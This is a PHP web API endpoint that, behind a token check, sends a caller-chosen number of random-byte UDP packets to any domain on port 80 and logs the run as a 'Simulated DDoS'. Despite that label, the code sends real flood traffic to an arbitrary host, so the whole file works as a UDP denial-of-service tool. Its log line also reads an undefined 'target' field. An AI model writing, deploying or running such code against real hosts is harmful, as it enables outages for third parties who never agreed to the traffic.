<?php
require_once __DIR__ . '/../helpers/logger.php';
require_once __DIR__ . '/../jwt/jwt_middleware.php';
validateToken();

$data = json_decode(file_get_contents('php://input'), true);

if (!isset($data['domain']) || !isset($data['packets'])) {
    echo json_encode(['success' => false, 'message' => 'Domain and packets are required']);
    http_response_code(400);
    exit();
}

$domain = $data['domain'];
$packets = (int) $data['packets'];
$bytes = isset($data['bytes']) ? (int) $data['bytes'] : 1024; // Default 1024 bytes
$time = isset($data['time']) ? (int) $data['time'] : 0; // Default 0 means no time limit

try {
    $startTime = time();
    $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

    if (!$socket) {
        throw new Exception('Failed to create socket');
    }

    for ($i = 0; $i < $packets; $i++) {
        if ($time > 0 && (time() - $startTime) >= $time) {
            break;
        }

        $packetData = random_bytes($bytes);
        socket_sendto($socket, $packetData, strlen($packetData), 0, $domain, 80);
    }

    socket_close($socket);
    
    // Retrieve username and URL from cookies
    $username = isset($_COOKIE['username']) ? $_COOKIE['username'] : 'unknown';
    $url = isset($_COOKIE['url']) ? $_COOKIE['url'] : 'unknown';

    // Log the action
    logAction($username, $url, "Simulated DDoS on target: {$data['target']}");

    echo json_encode(['success' => true, 'message' => 'Simulation completed']);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'message' => 'Error: ' . $e->getMessage()]);
}
